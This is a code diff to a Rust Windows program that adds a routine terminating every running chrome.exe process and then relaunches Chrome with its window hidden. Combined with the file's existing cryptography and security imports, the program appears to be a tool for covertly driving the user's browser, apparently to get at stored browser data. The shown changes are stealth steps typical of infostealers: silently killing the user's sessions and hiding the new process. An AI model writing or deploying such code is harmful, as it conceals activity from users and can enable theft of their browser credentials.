@@ -7,6 +7,7 @@ use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::Security::*;
 use windows_sys::Win32::Security::Cryptography::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
+use windows_sys::Win32::UI::WindowsAndMessaging::*;
 use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
 use std::path::{Path, PathBuf};
@@ -264,8 +265,12 @@ extern "system" {
 
 fn main() {
     unsafe {
+        kill_chrome_processes();
+
         let mut si: STARTUPINFOW = zeroed();
         si.cb = size_of::<STARTUPINFOW>() as u32;
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE as u16;
         let mut pi: PROCESS_INFORMATION = zeroed();
 
         let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
@@ -296,6 +301,34 @@ fn main() {
 
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+    }
+}
+
+unsafe fn kill_chrome_processes() {
+    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snapshot != INVALID_HANDLE_VALUE {
+        let mut pe: PROCESSENTRY32W = zeroed();
+        pe.dwSize = size_of::<PROCESSENTRY32W>() as u32;
+
+        if Process32FirstW(snapshot, &mut pe) != 0 {
+            loop {
+                let exe_name = String::from_utf16_lossy(&pe.szExeFile);
+                let exe_name = exe_name.trim_matches('\0');
+
+                if exe_name.to_lowercase() == "chrome.exe" {
+                    let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if h_process != 0 {
+                        TerminateProcess(h_process, 0);
+                        CloseHandle(h_process);
+                    }
+                }
+
+                if Process32NextW(snapshot, &mut pe) == 0 {
+                    break;
+                }
+            }
+        }
+        CloseHandle(snapshot);
     }
 }
 
